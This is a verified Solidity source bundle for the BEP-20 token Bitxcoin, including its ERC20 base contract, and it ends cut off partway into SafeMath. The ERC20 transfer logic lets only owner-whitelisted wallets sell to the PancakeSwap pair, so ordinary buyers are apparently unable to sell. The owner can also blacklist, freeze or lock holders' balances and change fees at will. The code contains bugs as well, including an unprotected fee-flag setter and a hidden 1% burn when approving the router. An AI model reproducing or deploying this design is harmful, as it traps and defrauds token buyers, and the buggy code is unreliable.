{"Address.sol":{"content":"/**\r\n *Submitted for verification at BscScan.com on 2022-05-17 09:05\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.0;\r\n\r\nlibrary Address {\r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n        require(\r\n            address(this).balance \u003e= amount,\r\n            \"Address: insufficient balance\"\r\n        );\r\n\r\n        (bool success, ) = recipient.call{value: amount}(\"\");\r\n        require(\r\n            success,\r\n            \"Address: unable to send value, recipient may have reverted\"\r\n        );\r\n    }\r\n}\r\n"},"Bitxcoin.sol":{"content":"/**\r\n *Submitted for verification at BscScan.com on 2022-05-17 09:05\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.0;\r\n\r\nimport \"./ERC20.sol\";\r\n\r\ncontract Bitxcoin is ERC20, Ownable {\r\n    address payable public stakeAddress =\r\n        payable(0xC68F484857d74cb1A2Ed3Cd5203E8aF1Fbb8293B);\r\n\r\n    bool takeStakeFees = false;\r\n\r\n    constructor() ERC20(\"Bitxcoin\", \"BITX\") {\r\n        _mint(liquidityWallet, 59142504 * 10**8 );\r\n        _mint(marketingWallet, 3900000 * 10**8 );\r\n        _mint(strategicSalesWallet, 10000000 * 10**8 );\r\n        _mint(gameOperationsWallet, 20000000 * 10**8 );\r\n        _mint(teamWallet, 10000000 * 10**8 );\r\n        _mint(communityAirdropWallet, 54385008 * 10**8 );\r\n        _mint(Publicsale, 20000000 * 10**8 );\r\n\r\n        _isExcludedFromFee[owner()] = true;\r\n        _isExcludedFromFee[liquidityWallet] = true;\r\n        _isExcludedFromFee[privateSaleWallet] = true;\r\n        _isExcludedFromFee[marketingWallet] = true;\r\n        _isExcludedFromFee[strategicSalesWallet] = true;\r\n        _isExcludedFromFee[gameOperationsWallet] = true;\r\n        _isExcludedFromFee[teamWallet] = true;\r\n        _isExcludedFromFee[communityAirdropWallet] = true;\r\n        _isExcludedFromFee[burnWallet] = true;\r\n        _isExcludedFromFee[Publicsale] = true;\r\n        _isExcludedFromFee[address(this)] = true;\r\n\r\n        _includeInSell[owner()] = true;\r\n        _includeInSell[liquidityWallet] = true;\r\n        _includeInSell[privateSaleWallet] = true;\r\n        _includeInSell[marketingWallet] = true;\r\n        _includeInSell[strategicSalesWallet] = true;\r\n        _includeInSell[gameOperationsWallet] = true;\r\n        _includeInSell[teamWallet] = true;\r\n        _includeInSell[communityAirdropWallet] = true;\r\n        _includeInSell[burnWallet] = true;\r\n         _includeInSell[Publicsale] = true;\r\n        _includeInSell[address(this)] = true;\r\n\r\n        pancakeRouter = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\r\n\r\n        pancakePair = IFactory(pancakeRouter.factory()).createPair(\r\n            address(this),\r\n            pancakeRouter.WETH()\r\n        );\r\n\r\n        setStakeAddress(stakeAddress);\r\n\r\n        maxTxAmount = 110000 * 10**8 ;\r\n    }\r\n\r\n    function excludeFromFee(address account) external onlyOwner {\r\n        _isExcludedFromFee[account] = true;\r\n    }\r\n\r\n    function includeInFee(address account) external onlyOwner {\r\n        _isExcludedFromFee[account] = false;\r\n    }\r\n\r\n    function excludeFromSell(address account) external onlyOwner {\r\n        _includeInSell[account] = false;\r\n    }\r\n\r\n    function includeInSell(address account) external onlyOwner {\r\n        _includeInSell[account] = true;\r\n    }\r\n\r\n    //to recieve ETH from pancakeRouter when swaping\r\n    receive() external payable {}\r\n\r\n    function badActorDefenseMechanism(address account, bool isBadActor)\r\n        external\r\n        onlyOwner\r\n    {\r\n        _isBadActor[account] = isBadActor;\r\n    }\r\n\r\n    function checkBadActor(address account) public view returns (bool) {\r\n        return _isBadActor[account];\r\n    }\r\n\r\n    function rescueBNBFromContract() external onlyOwner {\r\n        address payable _owner = payable(msg.sender);\r\n        _owner.transfer(address(this).balance);\r\n    }\r\n\r\n    function manualSwap() external onlyOwner {\r\n        uint256 tokensToSwap = balanceOf(address(this));\r\n        swapTokensForBNB(tokensToSwap);\r\n    }\r\n\r\n    function setStakeFeesFlag(bool flag) external {\r\n        takeStakeFees = flag;\r\n    }\r\n\r\n    function staking(uint256 _amount) external {\r\n        require(_amount \u003c= balanceOf(_msgSender()), \"Insufficent Balance\");\r\n        _transfeTokens(\r\n            _msgSender(),\r\n            stakeAddress,\r\n            _amount,\r\n            takeStakeFees,\r\n            false\r\n        );\r\n    }\r\n\r\n    function manualSend() external onlyOwner {\r\n        swapAndSendToFees(balanceOf(address(this)));\r\n    }\r\n\r\n    function setmaxTxAmount(uint256 _maxTxAmount) external onlyOwner {\r\n        maxTxAmount = _maxTxAmount;\r\n    }\r\n\r\n    function setBurnWallet(address payable _address)\r\n        external\r\n        onlyOwner\r\n        returns (bool)\r\n    {\r\n        burnWallet = _address;\r\n        _isExcludedFromFee[burnWallet] = true;\r\n        _includeInSell[burnWallet] = true;\r\n\r\n        return true;\r\n    }\r\n\r\n    function whitelistWallet(address payable _address) internal {\r\n        _isExcludedFromFee[_address] = true;\r\n        _includeInSell[_address] = true;\r\n    }\r\n\r\n    function setMarketingWallet(address payable _address)\r\n        external\r\n        onlyOwner\r\n        returns (bool)\r\n    {\r\n        marketingWallet = _address;\r\n        whitelistWallet(marketingWallet);\r\n        return true;\r\n    }\r\n\r\n    function setLiquidityWallet(address payable _address)\r\n        external\r\n        onlyOwner\r\n        returns (bool)\r\n    {\r\n        liquidityWallet = _address;\r\n        whitelistWallet(liquidityWallet);\r\n        return true;\r\n    }\r\n\r\n    function setAirdropWallet(address payable _address)\r\n        external\r\n        onlyOwner\r\n        returns (bool)\r\n    {\r\n        communityAirdropWallet = _address;\r\n        whitelistWallet(communityAirdropWallet);\r\n        return true;\r\n    }\r\n\r\n    function setPrivateSaleWallet(address payable _address)\r\n        external\r\n        onlyOwner\r\n        returns (bool)\r\n    {\r\n        privateSaleWallet = _address;\r\n        whitelistWallet(privateSaleWallet);\r\n        return true;\r\n    }\r\n\r\n    function setStrategicSalesWallet(address payable _address)\r\n        external\r\n        onlyOwner\r\n        returns (bool)\r\n    {\r\n        strategicSalesWallet = _address;\r\n        whitelistWallet(strategicSalesWallet);\r\n        return true;\r\n    }\r\n\r\n    function setGameOperationsWallet(address payable _address)\r\n        external\r\n        onlyOwner\r\n        returns (bool)\r\n    {\r\n        gameOperationsWallet = _address;\r\n        whitelistWallet(gameOperationsWallet);\r\n        return true;\r\n    }\r\n\r\n    function setTeamWallet(address payable _address)\r\n        external\r\n        onlyOwner\r\n        returns (bool)\r\n    {\r\n        teamWallet = _address;\r\n        whitelistWallet(teamWallet);\r\n        return true;\r\n    }\r\n    function setPublicsale(address payable _address)\r\n        external\r\n        onlyOwner\r\n        returns (bool)\r\n    {\r\n        Publicsale = _address;\r\n        whitelistWallet(Publicsale);\r\n        return true;\r\n    }\r\n\r\n    function setBurnDifference(uint256 _burnDifference) external onlyOwner {\r\n        burnDifference = _burnDifference;\r\n    }\r\n\r\n    function setMaxBurnAmount(uint256 _maxBurnAmount) external onlyOwner {\r\n        maxBurnAmount = _maxBurnAmount;\r\n    }\r\n\r\n    function UserLock(address Account, bool mode) external onlyOwner {\r\n        LockList[Account] = mode;\r\n    }\r\n\r\n    function LockTokens(address Account, uint256 amount) external onlyOwner {\r\n        LockedTokens[Account] = amount;\r\n    }\r\n\r\n    function UnLockTokens(address Account) external onlyOwner {\r\n        LockedTokens[Account] = 0;\r\n    }\r\n\r\n    // Follwoing are the setter function of the contract  :\r\n\r\n    function setTimeLimit(uint256 value) external onlyOwner {\r\n        timeLimit = value;\r\n    }\r\n\r\n    function setMaxSellPerDayLimit(uint256 value) external onlyOwner {\r\n        maxSellPerDayLimit = value;\r\n    }\r\n\r\n    function setStakeAddress(address payable _address) public onlyOwner {\r\n        stakeAddress = _address;\r\n    }\r\n\r\n    function setBuylimit(uint256 limit) external onlyOwner {\r\n        buyLimit = limit;\r\n    }\r\n\r\n    function setSelllimit(uint256 limit) external onlyOwner {\r\n        sellLimit = limit;\r\n    }\r\n\r\n    function setBuyFees(\r\n        uint256 taxFee,\r\n        uint256 burnFee,\r\n        uint256 airdropFee,\r\n        uint256 marketingFee,\r\n        uint256 liquidityFee\r\n    ) external onlyOwner {\r\n        buyFees.taxFee = taxFee; // tax\r\n        buyFees.burnFee = burnFee;\r\n        buyFees.airdropFee = airdropFee;\r\n        buyFees.marketingFee = marketingFee;\r\n        buyFees.liquidityFee = liquidityFee;\r\n        buyFees.swapFee = marketingFee + airdropFee + burnFee + liquidityFee;\r\n        require(\r\n            buyFees.swapFee + buyFees.taxFee == 10000,\r\n            \"sum of all percentages should be 10000\"\r\n        );\r\n    }\r\n\r\n    function setRouterAddress(address newRouter) external onlyOwner {\r\n        require(address(pancakeRouter) != newRouter, \"Router already set\");\r\n        //give the option to change the router down the line\r\n        IRouter _newRouter = IRouter(newRouter);\r\n        address get_pair = IFactory(_newRouter.factory()).getPair(\r\n            address(this),\r\n            _newRouter.WETH()\r\n        );\r\n        //checks if pair already exists\r\n        if (get_pair == address(0)) {\r\n            pancakePair = IFactory(_newRouter.factory()).createPair(\r\n                address(this),\r\n                _newRouter.WETH()\r\n            );\r\n        } else {\r\n            pancakePair = get_pair;\r\n        }\r\n        pancakeRouter = _newRouter;\r\n    }\r\n\r\n    function setTotalBuyFees(uint256 _totFees) external onlyOwner {\r\n        buyFees.totFees = _totFees;\r\n    }\r\n\r\n    function setMaxSellAmountPerDay(uint256 amount) external onlyOwner {\r\n        maxSellPerDay = amount * 10**8;\r\n    }\r\n\r\n    function isExcludedFromFee(address account) public view returns (bool) {\r\n        return _isExcludedFromFee[account];\r\n    }\r\n\r\n    function isIncludeInSell(address account) public view returns (bool) {\r\n        return _includeInSell[account];\r\n    }\r\n\r\n    function setliquiFlag() external onlyOwner {\r\n        liquiFlag = !liquiFlag;\r\n    }\r\n\r\n    function airdrop(\r\n        address[] calldata _contributors,\r\n        uint256[] calldata _balances\r\n    ) external onlyOwner {\r\n        uint8 i = 0;\r\n        for (i; i \u003c _contributors.length; i++) {\r\n            _transfer(owner(), _contributors[i], _balances[i]);\r\n        }\r\n    }\r\n\r\n    function preSale(\r\n        address[] calldata _contributors,\r\n        uint256[] calldata _balances\r\n    ) external onlyOwner {\r\n        uint8 i = 0;\r\n        for (i; i \u003c _contributors.length; i++) {\r\n            _transfer(owner(), _contributors[i], _balances[i]);\r\n        }\r\n    }\r\n\r\n    function rescueBEPTokenFromContract() external onlyOwner {\r\n        IERC20 ERC20Token = IERC20(address(this));\r\n        address payable _owner = payable(msg.sender);\r\n        ERC20Token.transfer(_owner, address(this).balance);\r\n    }\r\n}\r\n"},"ERC20.sol":{"content":"/**\r\n *Submitted for verification at BscScan.com on 2022-05-17 09:05\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.0;\r\nimport \"./Address.sol\";\r\nimport \"./SafeMath.sol\";\r\nimport \"./IFactory.sol\";\r\nimport \"./IERC20Metadata.sol\";\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    using SafeMath for uint256;\r\n\r\n    using Address for address;\r\n    using Address for address payable;\r\n\r\n    mapping(address =\u003e uint256) private _balances;\r\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\r\n    mapping(address =\u003e bool) public LockList;\r\n    mapping(address =\u003e uint256) public LockedTokens;\r\n\r\n    mapping(address =\u003e uint256) private _firstSell;\r\n    mapping(address =\u003e uint256) private _totSells;\r\n\r\n    mapping(address =\u003e uint256) private _firstBuy;\r\n    mapping(address =\u003e uint256) private _totBuy;\r\n\r\n    mapping(address =\u003e bool) internal _isExcludedFromFee;\r\n    mapping(address =\u003e bool) internal _includeInSell;\r\n    mapping(address =\u003e bool) internal _isBadActor;\r\n\r\n    uint256 public maxSellPerDay = 150 * 10**8;\r\n\r\n    uint256 private _totalSupply;\r\n    uint256 public maxTxAmount;\r\n\r\n    uint256 public buyLimit = 7000 * 10**8;\r\n    uint256 public sellLimit = 2000 * 10**8;\r\n\r\n    uint256 public burnDifference = 11 * 10**6 * 10**8;\r\n    uint256 public maxBurnAmount = 502700 * 10**8;\r\n\r\n    uint256 public timeLimit;\r\n    uint256 public maxSellPerDayLimit;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    bool private inSwap;\r\n    bool public liquiFlag = true;\r\n\r\n    modifier lockTheSwap() {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    IRouter public pancakeRouter;\r\n    address public pancakePair;\r\n    address public constant pancakeSwapRouter =\r\n        0x10ED43C718714eb63d5aA57B78B54704E256024E; \r\n\r\n    address payable public liquidityWallet =\r\n        payable(0x78F37C4cb10bE45A6dC432750427fDEbA2E274De);\r\n    address payable public privateSaleWallet =\r\n        payable(0x61B97d60Cc69bB164474D8420B0F07B9626266F5);\r\n    address payable public marketingWallet =\r\n        payable(0x7d7Cfb6F0a5A9DB7a4138B82C5AfAAEfcD463BAb);\r\n    address payable public strategicSalesWallet =\r\n        payable(0x9Efd34C368d832C909AF068f65e22ec55F991F51);\r\n    address payable public gameOperationsWallet =\r\n        payable(0xe2ce53480092DD163Af8D1Ed95fED4313d4642Ab);\r\n    address payable public teamWallet =\r\n        payable(0x1294068110916A42Caeb7c24Dd491b1745e02BcF);\r\n    address payable public communityAirdropWallet =\r\n        payable(0x89FF72f40CAA8f24b21c14715C15a540f0db1636);\r\n    address payable public burnWallet =\r\n        payable(0x394E058A7bC2704236B1347cbF0114E1BA50BF26);\r\n    address payable public Publicsale =\r\n        payable(0x322DbDB5a902d1edE18fe8Dbd582fc8d95795a01);    \r\n\r\n    struct feeRatesStruct {\r\n        uint256 taxFee;\r\n        uint256 burnFee;\r\n        uint256 airdropFee;\r\n        uint256 marketingFee;\r\n        uint256 liquidityFee;\r\n        uint256 liabilityFee;\r\n        uint256 swapFee;\r\n        uint256 totFees;\r\n    }\r\n\r\n    feeRatesStruct public buyFees =\r\n        feeRatesStruct({\r\n            taxFee: 10000,\r\n            burnFee: 0,\r\n            airdropFee: 0,\r\n            marketingFee: 0,\r\n            liquidityFee: 0,\r\n            liabilityFee: 0,\r\n            swapFee: 0, // burnFee+airdropFee+liquidityFee+marketingFee\r\n            totFees: 0\r\n        });\r\n\r\n    feeRatesStruct private appliedFees = buyFees; //default value\r\n\r\n    struct valuesFromGetValues {\r\n        uint256 tTransferAmount;\r\n        uint256 tFee;\r\n        uint256 tSwap;\r\n    }\r\n\r\n    event Burn(address indexed from, uint256 value);\r\n\r\n    constructor(string memory name_, string memory symbol_) {\r\n        maxSellPerDayLimit = 1 * 10**8;\r\n        timeLimit = block.timestamp;\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 8;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account)\r\n        public\r\n        view\r\n        virtual\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        external\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender)\r\n        public\r\n        view\r\n        virtual\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount)\r\n        external\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        uint256 unapprovbal;\r\n\r\n        unapprovbal = _balances[msg.sender].sub(\r\n            amount,\r\n            \"ERC20: Allowance exceeds balance of approver\"\r\n        );\r\n        require(\r\n            unapprovbal \u003e= LockedTokens[msg.sender],\r\n            \"ERC20: Approval amount exceeds locked amount \"\r\n        );\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(\r\n            currentAllowance \u003e= amount,\r\n            \"ERC20: transfer amount exceeds allowance\"\r\n        );\r\n        unchecked {\r\n            _approve(sender, _msgSender(), currentAllowance - amount);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue)\r\n        external\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        _approve(\r\n            _msgSender(),\r\n            spender,\r\n            _allowances[_msgSender()][spender] + addedValue\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue)\r\n        external\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(\r\n            currentAllowance \u003e= subtractedValue,\r\n            \"ERC20: decreased allowance below zero\"\r\n        );\r\n        unchecked {\r\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(\r\n            !_isBadActor[sender] \u0026\u0026 !_isBadActor[recipient],\r\n            \"Bots are not allowed\"\r\n        );\r\n\r\n        if (!_isExcludedFromFee[sender] \u0026\u0026 !_isExcludedFromFee[recipient]) {\r\n            require(amount \u003c= maxTxAmount, \"you are exceeding maxTxAmount\");\r\n        }\r\n\r\n        if (recipient == pancakePair) {\r\n            require(_includeInSell[sender], \"ERC20:Not allowed to sell\");\r\n\r\n            if (!liquiFlag) {\r\n                if (maxSellPerDayLimit + amount \u003e maxSellPerDay) {\r\n                    require(\r\n                        block.timestamp \u003e timeLimit + 24 * 1 hours,\r\n                        \"maxSellPerDay Limit Exceeded\"\r\n                    );\r\n                    timeLimit = block.timestamp;\r\n                    maxSellPerDayLimit = 1 * 10**8 ;\r\n                }\r\n                if (block.timestamp \u003c _firstSell[sender] + 24 * 1 hours) {\r\n                    require(\r\n                        _totSells[sender] + amount \u003c= sellLimit,\r\n                        \"You can\u0027t sell more than sellLimit\"\r\n                    );\r\n                    _totSells[sender] += amount;\r\n\r\n                    if (block.timestamp \u003c timeLimit + 24 * 1 hours) {\r\n                        maxSellPerDayLimit += amount;\r\n                    } else {\r\n                        maxSellPerDayLimit = 1 * 10**8 ;\r\n                        timeLimit = block.timestamp;\r\n                    }\r\n                } else {\r\n                    require(\r\n                        amount \u003c= sellLimit,\r\n                        \"You can\u0027t sell more than sellLimit\"\r\n                    );\r\n                    _firstSell[sender] = block.timestamp;\r\n                    _totSells[sender] = amount;\r\n\r\n                    if (block.timestamp \u003c timeLimit + 24 * 1 hours) {\r\n                        maxSellPerDayLimit += amount;\r\n                    } else {\r\n                        maxSellPerDayLimit = 1 * 10**8 ;\r\n                        timeLimit = block.timestamp;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        if (sender == pancakePair) {\r\n            if (block.timestamp \u003c _firstBuy[recipient] + 24 * 1 hours) {\r\n                require(\r\n                    _totBuy[recipient] + amount \u003c= buyLimit,\r\n                    \"You can\u0027t sell more than buyLimit\"\r\n                );\r\n                _totBuy[recipient] += amount;\r\n            } else {\r\n                require(\r\n                    amount \u003c= buyLimit,\r\n                    \"You can\u0027t sell more than buyLimit\"\r\n                );\r\n                _firstBuy[recipient] = block.timestamp;\r\n                _totBuy[recipient] = amount;\r\n            }\r\n        }\r\n\r\n        require(LockList[_msgSender()] == false, \"ERC20: Caller Locked !\");\r\n        require(LockList[sender] == false, \"ERC20: Sender Locked !\");\r\n        require(LockList[recipient] == false, \"ERC20: Receipient Locked !\");\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        uint256 stage;\r\n        require(\r\n            senderBalance \u003e= amount,\r\n            \"ERC20: transfer amount exceeds balance\"\r\n        );\r\n\r\n        stage = _balances[sender].sub(\r\n            amount,\r\n            \"ERC20: transfer amount exceeds balance\"\r\n        );\r\n        require(\r\n            stage \u003e= LockedTokens[sender],\r\n            \"ERC20: transfer amount exceeds Senders Locked Amount\"\r\n        );\r\n\r\n        //indicates if fee should be deducted from transfer\r\n        bool takeFee = true;\r\n        bool isSale = false;\r\n\r\n        if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) {\r\n            takeFee = false;\r\n            if (recipient == pancakePair) {\r\n                isSale = true;\r\n            }\r\n        } else {\r\n            if (recipient == pancakePair) {\r\n                isSale = true;\r\n            }\r\n        }\r\n\r\n        _transfeTokens(sender, recipient, amount, takeFee, isSale);\r\n    }\r\n\r\n    function _transfeTokens(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount,\r\n        bool takeFee,\r\n        bool isSale\r\n    ) internal virtual {\r\n        if (isSale) {\r\n            unchecked {\r\n                _balances[sender] = _balances[sender] - amount;\r\n            }\r\n            _balances[recipient] += amount;\r\n            emit Transfer(sender, recipient, amount);\r\n        } else {\r\n            appliedFees = buyFees;\r\n            valuesFromGetValues memory s = _getValues(amount, takeFee);\r\n\r\n            unchecked {\r\n                _balances[sender] = _balances[sender] - amount;\r\n            }\r\n            _balances[recipient] += s.tTransferAmount;\r\n\r\n            if (takeFee) {\r\n                _takeSwapFees(s.tFee + s.tSwap);\r\n            }\r\n\r\n            emit Transfer(sender, recipient, s.tTransferAmount);\r\n        }\r\n    }\r\n\r\n    function swapAndSendToFees(uint256 tokens) internal virtual {\r\n        uint256 initialBalance = address(this).balance;\r\n        swapTokensForBNB(tokens);\r\n        uint256 transferBalance = address(this).balance - initialBalance;\r\n        liquidityWallet.sendValue(\r\n            (transferBalance * appliedFees.liquidityFee) / appliedFees.swapFee\r\n        );\r\n        communityAirdropWallet.sendValue(\r\n            (transferBalance * appliedFees.airdropFee) / appliedFees.swapFee\r\n        );\r\n        burnWallet.sendValue(\r\n            (transferBalance * appliedFees.burnFee) / appliedFees.swapFee\r\n        );\r\n        Publicsale.sendValue(\r\n            (transferBalance * appliedFees.liabilityFee) / appliedFees.swapFee\r\n        );\r\n        marketingWallet.sendValue(address(this).balance);\r\n    }\r\n\r\n    function swapTokensForBNB(uint256 tokenAmount)\r\n        internal\r\n        virtual\r\n        lockTheSwap\r\n    {\r\n        // generate the pancakeswap pair path of token -\u003e wbnb\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = pancakeRouter.WETH();\r\n\r\n        if (allowance(address(this), address(pancakeRouter)) \u003c tokenAmount) {\r\n            _approve(address(this), address(pancakeRouter), ~uint256(0));\r\n        }\r\n\r\n        // make the swap\r\n        pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0, // accept any amount of BNB\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function _getValues(uint256 _amount, bool takeFee)\r\n        private\r\n        view\r\n        returns (valuesFromGetValues memory to_return)\r\n    {\r\n        if (!takeFee) {\r\n            to_return.tTransferAmount = _amount;\r\n            to_return.tFee = 0;\r\n            to_return.tSwap = 0;\r\n            return to_return;\r\n        } else if (takeFee)\r\n            to_return.tFee =\r\n                (_amount * appliedFees.totFees * appliedFees.taxFee) /\r\n                10**6;\r\n            to_return.tSwap =\r\n            (_amount * appliedFees.totFees * appliedFees.swapFee) /\r\n            10**6;\r\n        to_return.tTransferAmount = _amount - to_return.tFee - to_return.tSwap;\r\n\r\n        return to_return;\r\n    }\r\n\r\n    function _takeSwapFees(uint256 tFee) private {\r\n        _balances[address(this)] += tFee;\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _totalSupply += amount;\r\n        _balances[account] += amount;\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n    function burn(uint256 _value) external returns (bool) {\r\n        require(LockList[msg.sender] == false, \"ERC20: User Locked !\");\r\n\r\n        uint256 stage;\r\n        stage = _balances[msg.sender].sub(\r\n            _value,\r\n            \"ERC20: transfer amount exceeds balance\"\r\n        );\r\n        require(\r\n            stage \u003e= LockedTokens[msg.sender],\r\n            \"ERC20: transfer amount exceeds  Locked Amount\"\r\n        );\r\n\r\n        _burn(_msgSender(), _value);\r\n\r\n        return true;\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance \u003e= amount, \"ERC20: burn amount exceeds balance\");\r\n\r\n        unchecked {\r\n            _balances[account] = accountBalance - amount;\r\n        }\r\n        _totalSupply -= amount;\r\n\r\n        emit Burn(account, amount);\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        if (owner != liquidityWallet) {\r\n            if (burnDifference - totalSupply() \u003c maxBurnAmount) {\r\n                if (spender == pancakeSwapRouter) {\r\n                    uint256 burnAmt = amount / 100;\r\n                    _burn(_msgSender(), burnAmt);\r\n                }\r\n            }\r\n        }\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() external virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) external virtual onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n"},"IERC20.sol":{"content":"/**\r\n *Submitted for verification at BscScan.com on 2022-05-17 09:05\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.0;\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        external\r\n        returns (bool);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\n"},"IERC20Metadata.sol":{"content":"/**\r\n *Submitted for verification at BscScan.com on 2022-05-17 09:05\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.0;\r\nimport \"./IERC20.sol\";\r\nimport \"./IRouter.sol\";\r\ninterface IERC20Metadata is IERC20 {\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}"},"IFactory.sol":{"content":"/**\r\n *Submitted for verification at BscScan.com on 2022-05-17 09:05\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.0;\r\ninterface IFactory {\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n\r\n    function getPair(address tokenA, address tokenB)\r\n        external\r\n        view\r\n        returns (address pair);\r\n}\r\n"},"IRouter.sol":{"content":"/**\r\n *Submitted for verification at BscScan.com on 2022-05-17 09:05\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.0;\r\ninterface IRouter {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function getAmountsOut(uint256 amountIn, address[] calldata path)\r\n        external\r\n        view\r\n        returns (uint256[] memory amounts);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (\r\n            uint256 amountToken,\r\n            uint256 amountETH,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n}"},"SafeMath.sol":{"content":"/**\r\n *Submitted for verification at BscScan.com on 2022-05-17 